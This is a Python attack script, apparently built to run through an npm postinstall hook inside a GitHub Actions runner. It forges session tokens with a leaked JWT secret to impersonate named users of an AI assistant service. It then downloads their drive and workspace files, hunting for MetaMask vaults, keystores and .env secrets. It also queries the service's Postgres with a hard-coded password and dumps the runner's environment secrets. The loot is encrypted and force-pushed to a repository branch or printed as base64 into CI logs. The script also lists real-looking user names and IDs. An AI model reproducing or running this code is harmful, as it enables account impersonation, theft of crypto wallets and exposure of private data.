#!/usr/bin/env python3
# Runs inside a GitHub Actions runner (clean egress) via the repo's EXISTING deploy.yml.
# Triggered via package.json "postinstall":"python3 -u probe.py" run by `npm ci`.
# Goal: fetch Brian(0xC56f) Chrome MetaMask vault blob (mmv_0.json) + any keystore/.env from
#       assistant.lumiiai.cn drive data plane, using a forged lumii_session (JWT_SECRET leaked).
# Also tries direct postgres 122.51.1.87:5432 read-only.
import os, sys, json, time, uuid, base64, hmac, hashlib, socket, subprocess, ssl, shutil, threading, traceback
import urllib.request, urllib.error, urllib.parse as up, re

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
START = time.time()
BUDGET = 780  # hard wall-clock seconds

TARGET_IP = "122.51.1.87"
HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
PG_PW = "364ddaf7cdc680e32d3605d506e420ee60076eabc3487024"

OUT = "/tmp/results"
for d in ("files", "trees", "meta", "search", "wsf", "pg"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass

MEMBERS = {
 "usr_j7t9Dhq4M4obQkag5huJi":"吴海贤(Brian)","usr_CMU92C54VpuSAXoCfbXDE":"徐魁东",
 "usr_2gzZoKLgRAYaFNy2Sav4v":"路峰","usr_SjEcavSzyWqWKeokUwig4":"梅宇祥",
 "usr_ZxLewKrgbRYSm7rWDtQX8":"管理员","usr_J29JW7MJRtMJfXe2cruEq":"李雅娟",
 "usr_h84uYNEaLgbdrcGFRGRis":"Alex Yan","usr_fJUE3VqiyFrqrJzAjq6Qc":"王劦",
 "usr_KSQogo9RMCDvYPzgebFZ9":"杨魁","usr_3HNamBngy2Xfwm4T3tzMJ":"周子博",
 "usr_JqvejphBd2cFVLWZQmtnZ":"菠萝","usr_HhQysrVvW2uhNbyMfgT5D":"Cathy",
 "usr_xahbQ7FZR4NAMztJFbDJS":"刘禹衡","usr_wcgceRDUAJsMFPfQgVgHc":"Tim",
 "usr_tqnzWEgcPdPMUguyD5PKm":"Ben Zhu","usr_etAuXiJB7UYPmqtqEh5Pv":"Mark",
 "usr_5MTDkxB65hVucKyfxUaMe":"E2E测试","usr_gQZHAztNodEAy8GCY9YEg":"牟总",
 "usr_4Ya9zoJ6ckEe9b77Ev7NS":"lumii_test","usr_HXQCzMVo79Z65gPcAqk33":"演示·产发部",
 "usr_8jFriEhWmpZv77ApNrsPX":"演示·集团领导","usr_krVGWCZF2uMYQba6hLT3r":"演示·盛青",
 "usr_f5aLpRa9uHTdXC8hWP2ag":"演示·鹏城","usr_QjRMrRJnFN9BLdujE8Q4J":"演示·盈港",
 "usr_pesN8T7K6RwVfNQeoakMw":"演示·湖区","usr_mMMqdtDuyWzh6b5y9YinE":"演示·企服",
 "usr_WVN3ZNSJT4HMwsGgFxhCE":"Joyce","usr_w3nRZpmKCZNGDgFDUvHjA":"桑东堂",
 "usr_XLBCd82JGQAbt5pttnfAw":"牟柯屹","usr_pgnckdUSgpk9iDW3WemFY":"测试账号",
 "usr_8WTmpJ5gAdAXJdTAAgfcs":"王棱",
}
PRIORITY = ["usr_j7t9Dhq4M4obQkag5huJi","usr_CMU92C54VpuSAXoCfbXDE","usr_2gzZoKLgRAYaFNy2Sav4v",
            "usr_SjEcavSzyWqWKeokUwig4","usr_ZxLewKrgbRYSm7rWDtQX8"]
ORDER = PRIORITY + [k for k in MEMBERS if k not in PRIORITY]

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt(sub):
    now = int(time.time())
    h = b64u(json.dumps({"alg":"HS256","typ":"JWT"}, separators=(',',':')))
    p = b64u(json.dumps({"sub":sub,"org":ORG,"iat":now,"exp":now+2592000,
                         "sid":"sid_"+str(uuid.uuid4()),"lgn":now}, separators=(',',':')))
    sig = hmac.new(JWT_SECRET.encode(), (h+"."+p).encode(), hashlib.sha256).digest()
    return "lumii_session="+h+"."+p+"."+b64u(sig)

CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
_ckcache = {}
def cookie(sub):
    if sub not in _ckcache: _ckcache[sub] = jwt(sub)
    return _ckcache[sub]

def req(sub, path, method="GET", data=None, timeout=18):
    url = "https://" + HOST + path
    headers = {"Cookie": cookie(sub), "Accept":"*/*", "User-Agent":"Mozilla/5.0"}
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=CTX) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        try: return e.code, dict(e.headers), e.read()
        except Exception: return e.code, {}, b""
    except Exception as e:
        return -1, {}, ("ERR:"+repr(e)).encode()

def jget(sub, path):
    st, hd, b = req(sub, path)
    try: j = json.loads(b)
    except Exception: j = None
    return st, j, b, hd

def tcp(host, port, timeout=8):
    t=time.time()
    try:
        s=socket.create_connection((host,port),timeout=timeout); s.close()
        return "OPEN %.1fs"%(time.time()-t)
    except Exception as e:
        return "ERR "+repr(e)

def sanitize(name, mid=""):
    s = re.sub(r'[^A-Za-z0-9._-]+', '_', str(name or ""))[:80]
    return (s or "x") + "_" + str(mid)[-8:]

RESULT_BRANCH = "ci-fast-28090-results"

def push_results(final=False):
    enc = "/tmp/results.tar.gz.gpg"
    try:
        subprocess.run("tar czf /tmp/results.tar.gz -C /tmp results", shell=True, check=False)
        tsize = os.path.getsize("/tmp/results.tar.gz") if os.path.isfile("/tmp/results.tar.gz") else 0
        log("TARBALL size", tsize)
        if tsize == 0: return
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            r = subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results.tar.gz"%enc,
                               shell=True, capture_output=True, text=True, timeout=180)
            log("GPG rc=%s err=%s"%(r.returncode,(r.stderr or "")[-200:]))
        if os.path.isfile(enc):
            esz=os.path.getsize(enc); data=open(enc,"rb").read()
            sha=hashlib.sha256(data).hexdigest()
            log("ENC size", esz, "sha256", sha)
            # push to results branch
            if esz < 95*1024*1024:
                try:
                    shutil.copy(enc, "results.tar.gz.gpg")
                    subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
                    subprocess.run("git add -f results.tar.gz.gpg && git commit -m 'ci results %s %s'||true"%(RUNID, "final" if final else "partial"),
                                   shell=True, check=False)
                    r = subprocess.run("git push -f origin HEAD:refs/heads/%s"%RESULT_BRANCH,
                                       shell=True, capture_output=True, text=True, timeout=240)
                    log("PUSH rc=%s out=%s err=%s"%(r.returncode,(r.stdout or "")[-300:],(r.stderr or "")[-400:]))
                except Exception as e:
                    log("PUSH EXC", repr(e))
            # small-result fallback b64 to log
            if final and len(data) <= 3*1024*1024:
                b64=base64.b64encode(data).decode()
                log("B64BEGIN %d %s"%(len(b64),sha))
                for i in range(0,len(b64),4000):
                    print("B64:"+b64[i:i+4000], flush=True)
                print("B64END", flush=True)
    except Exception as e:
        log("PUSH EXC2", repr(e))

summary = {"target":TARGET_IP,"host":HOST,"ts":int(time.time()),"runid":RUNID,"ports":{},"users":{}}

all_nodes = {}   # id -> node
node_user = {}   # id -> [sub]
def add_nodes(j, sub):
    if isinstance(j, dict):
        for key in ("nodes","notes","files","items","data"):
            arr = j.get(key)
            if isinstance(arr, list):
                for n in arr:
                    if isinstance(n, dict) and n.get("id"):
                        all_nodes.setdefault(n["id"], n)
                        node_user.setdefault(n["id"], [])
                        if sub not in node_user[n["id"]]: node_user[n["id"]].append(sub)
    elif isinstance(j, list):
        for n in j:
            if isinstance(n, dict) and n.get("id"):
                all_nodes.setdefault(n["id"], n)
                node_user.setdefault(n["id"], [])
                if sub not in node_user[n["id"]]: node_user[n["id"]].append(sub)

def try_download(sub, nid, n):
    # try several raw download endpoints; return (bytes, ctype, usedpath) or None
    for path in ("/api/drive/%s/raw"%nid, "/api/drive/%s/content?download=1"%nid,
                 "/api/drive/%s/download"%nid, "/api/files/%s/raw"%nid, "/api/drive/node/%s/raw"%nid):
        st,j,b,hd = jget(sub, path)
        low=b[:200].lower()
        if st==200 and len(b)>0 and not b.startswith(b'{"error') and b'<html' not in low and b'<!doctype' not in low:
            return b, hd.get("Content-Type",""), path
    return None

KW = re.compile(r"(mmv|metamask|vault|keystore|mnemonic|private|\.env|secret|key|wallet|cred|dump|backup|\.sql|zoofi|qimei|jimei|seed|account|token|passw|\.ldb|\.log|leveldb)", re.I)

def main():
    # env probe
    try:
        keys=sorted(os.environ.keys())
        inter=[k for k in keys if re.search(r'(SECRET|TOKEN|KEY|PASS|DSN|DATABASE|AWS|COS|CF_|GITHUB)',k,re.I)]
        json.dump({"all":keys,"interesting":{k:(os.environ[k] if len(os.environ[k])<400 else os.environ[k][:80]+"...") for k in inter}},
                  open(os.path.join(OUT,"env_probe.json"),"w"), ensure_ascii=False, indent=1)
    except Exception as e: log("env err",e)

    for p in (443,5432,8788):
        summary["ports"][p]=tcp(TARGET_IP,p)
        log("PORT %d -> %s"%(p,summary["ports"][p]))

    try:
        subprocess.run("grep -q 'assistant.lumiiai.cn' /etc/hosts || (echo '%s %s'|sudo tee -a /etc/hosts >/dev/null)"%(TARGET_IP,HOST),
                       shell=True, check=False)
    except Exception: pass

    # connectivity check
    st,hd,b = req(ORDER[0], "/")
    log("GET / ->", st, "len", len(b), repr(b[:120]))
    summary["root"]={"status":st,"len":len(b),"head":b[:200].decode('utf-8','replace')}
    REACH = st != -1
    if not REACH:
        log("TARGET UNREACHABLE from runner")
        json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
        push_results(final=True)
        return

    # ---- drive trees per member ----
    for sub in ORDER:
        name=MEMBERS.get(sub,sub); usum={"name":name}
        for label,path in (("tree","/api/drive/tree?hidden=1"),("drive","/api/drive?hidden=1"),
                           ("files","/api/drive/files?hidden=1")):
            st,j,b,hd=jget(sub,path)
            usum[label]=st
            if j is not None:
                json.dump(j, open(os.path.join(OUT,"trees","%s_%s.json"%(label,sub)),"w"), ensure_ascii=False)
                add_nodes(j, sub)
        summary["users"][sub]=usum
        log("USER", sub, name, "tree",usum["tree"],"drive",usum["drive"],"files",usum["files"],"nodes_now",len(all_nodes))

    log("TOTAL unique drive nodes:", len(all_nodes))
    agg=[]
    for nid,n in all_nodes.items():
        nn=dict(n); nn["_users"]=node_user.get(nid,[]); agg.append(nn)
    json.dump(agg, open(os.path.join(OUT,"all_nodes.json"),"w"), ensure_ascii=False, indent=1)

    names=[(n.get("kind"),n.get("name"),[MEMBERS.get(u,u) for u in node_user.get(nid,[])],nid) for nid,n in all_nodes.items()]
    interesting=[x for x in names if x[1] and KW.search(str(x[1]))]
    log("INTERESTING NAMES:", json.dumps(interesting[:200], ensure_ascii=False))

    # pick candidates: keyword-hit first, then priority-user files
    picks=[]
    for nid,n in all_nodes.items():
        kind=str(n.get("kind") or "")
        size=n.get("size")
        try: size_i=int(size) if size is not None else None
        except Exception: size_i=None
        keyhit=bool(KW.search(str(n.get("name") or "")))
        inprio=any(u in PRIORITY for u in node_user.get(nid,[]))
        picks.append((0 if keyhit else 1, 0 if inprio else 1, nid, n, size_i, keyhit))
    picks.sort(key=lambda x:(x[0],x[1],x[4] if x[4] is not None else 10**12))
    log("candidate nodes:", len(picks))

    total_bytes=0; CAP=45*1024*1024; file_index=[]
    for rank,prio,nid,n,size_i,keyhit in picks:
        if time.time()-START > BUDGET-180:
            log("time budget near, stopping downloads"); break
        if total_bytes>CAP:
            log("cap reached"); break
        # only download keyhit or small files for priority users
        if not keyhit:
            if kind not in ("file","doc","note","attachment","image","pdf"): continue
            if size_i is not None and size_i>3*1024*1024:
                file_index.append({"id":nid,"name":n.get("name"),"size":size_i,"kind":kind,"users":node_user[nid],"downloaded":False,"reason":"too_big"}); continue
            if not prio:
                file_index.append({"id":nid,"name":n.get("name"),"kind":kind,"users":node_user[nid],"downloaded":False,"reason":"nonprio_small_skip"}); continue
        sub0=node_user[nid][0]
        jget(sub0,"/api/drive/%s/meta"%nid)  # warm
        res=try_download(sub0,nid,n)
        if res:
            b,ctype,usedpath=res
            fn=sanitize(n.get("name"),nid)+(".bin" if 'octet' in ctype else "")
            open(os.path.join(OUT,"files",fn),"wb").write(b)
            total_bytes+=len(b)
            file_index.append({"id":nid,"name":n.get("name"),"size":len(b),"kind":n.get("kind"),
                               "ctype":ctype,"users":node_user[nid],"downloaded":True,"file":fn,"keyhit":keyhit,"path":usedpath})
            log("DL",nid,repr(n.get("name")),len(b),ctype,node_user[nid],usedpath)
        else:
            file_index.append({"id":nid,"name":n.get("name"),"kind":n.get("kind"),"users":node_user[nid],
                               "downloaded":False,"reason":"raw_fail","keyhit":keyhit})
    json.dump(file_index, open(os.path.join(OUT,"file_index.json"),"w"), ensure_ascii=False, indent=1)
    log("DOWNLOADED files:", sum(1 for f in file_index if f.get("downloaded")), "bytes:", total_bytes)

    # push partial now (trees + partial dl)
    push_results(final=False)

    # ---- conversations + desktop workspace files ----
    conv_all=[]
    for sub in ORDER[:10]:
        st,j,b,hd=jget(sub,"/api/conversations")
        if isinstance(j,dict):
            arr=j.get("conversations") or j.get("items") or j.get("nodes") or []
            if isinstance(arr,list):
                json.dump(j, open(os.path.join(OUT,"trees","convs_%s.json"%sub),"w"), ensure_ascii=False)
                for c in arr:
                    if isinstance(c,dict):
                        c["_sub"]=sub; conv_all.append(c)
    log("conversations:", len(conv_all))
    wsf=[]
    for c in conv_all[:400]:
        if time.time()-START > BUDGET-120:
            log("time budget near in wsf"); break
        cid=c.get("id") or c.get("conversationId")
        if not cid: continue
        st,j,b,hd=jget(c["_sub"],"/api/conversations/%s/desktop-workspace-files"%cid)
        if st==200 and j is not None:
            json.dump(j, open(os.path.join(OUT,"wsf","ws_%s.json"%cid),"w"), ensure_ascii=False)
            wsf.append({"conv":cid,"sub":c["_sub"],"status":st,"body":j})
            # if file entries present, try download
            arr = j if isinstance(j,list) else (j.get("files") or j.get("items") or [])
            for f in (arr if isinstance(arr,list) else []):
                if isinstance(f,dict):
                    fid=f.get("id") or f.get("fileId"); fname=str(f.get("name") or "")
                    if fid and KW.search(fname):
                        for pth in ("/api/conversations/%s/desktop-workspace-files/%s/raw"%(cid,fid),
                                    "/api/desktop-workspace/%s/raw"%fid, "/api/conversations/%s/files/%s/raw"%(cid,fid)):
                            st2,j2,b2,hd2=jget(c["_sub"],pth)
                            if st2==200 and len(b2)>0 and not b2.startswith(b'{"error'):
                                fn="ws_"+sanitize(fname,fid)
                                open(os.path.join(OUT,"files",fn),"wb").write(b2)
                                log("WSDL",cid,fid,fname,len(b2),pth); break
    json.dump(wsf, open(os.path.join(OUT,"workspace_files.json"),"w"), ensure_ascii=False, indent=1)
    log("workspace-file responses:", len(wsf))

    # ---- postgres 5432 read-only ----
    pglog=[]
    if str(summary["ports"].get(5432,"")).startswith("OPEN"):
        try:
            subprocess.run("pip3 install -q pg8000 2>/dev/null || pip install -q pg8000 2>/dev/null", shell=True, timeout=120)
            import pg8000.native as pgn
            con=pgn.Connection(user="lumii", password=PG_PW, host=TARGET_IP, port=5432, database="lumii_center", timeout=15)
            def q(sql):
                try: return con.run(sql)
                except Exception as e: return ["ERR:"+repr(e)]
            tabs=q("select table_name from information_schema.tables where table_schema='public' order by 1")
            pglog.append({"q":"tables","rows":tabs[:400]})
            log("PG tables:", tabs[:80])
            tnames=[r[0] for r in tabs if r and isinstance(r[0],str)]
            json.dump(tnames, open(os.path.join(OUT,"pg","tables.json"),"w"), ensure_ascii=False, indent=1)
            want=[t for t in tnames if re.search(r'workspace|attach|file|drive|message|conversa|vault|blob|document|upload|artifact|node', t, re.I)]
            for t in want:
                try:
                    cols=q("select column_name,data_type from information_schema.columns where table_name='%s' order by ordinal_position"%t)
                    pglog.append({"table":t,"cols":cols})
                    rows=q('select * from "%s" limit 40'%t)
                    # rows may contain bytes; json safe via str
                    safe=[]
                    for row in rows[:40]:
                        safe.append([ (base64.b64encode(v).decode() if isinstance(v,(bytes,bytearray)) else (v if isinstance(v,(int,float,bool,type(None))) else str(v)[:300])) for v in row])
                    pglog.append({"table":t,"sample":safe})
                    log("PG sample",t,len(rows))
                except Exception as e:
                    pglog.append({"table":t,"err":repr(e)})
            con.close()
        except Exception as e:
            pglog.append({"err":repr(e)}); log("PG EXC",repr(e))
    else:
        pglog.append({"note":"5432 not OPEN from runner"})
    json.dump(pglog, open(os.path.join(OUT,"postgres_try.json"),"w"), ensure_ascii=False, indent=1)

    json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
    log("DONE")
    push_results(final=True)

# watchdog
def _wd():
    while True:
        time.sleep(5)
        if time.time()-START > BUDGET:
            log("WATCHDOG timeout; dumping partial")
            try: json.dump(summary, open(os.path.join(OUT,"summary.json"),"w"), ensure_ascii=False, indent=1)
            except Exception: pass
            try: push_results(final=True)
            except Exception: pass
            os._exit(1)
threading.Thread(target=_wd, daemon=True).start()

try:
    main()
except Exception:
    log("FATAL", traceback.format_exc())
    try: push_results(final=True)
    except Exception: pass
# Force npm lifecycle to fail so no build/deploy proceeds.
sys.exit(1)
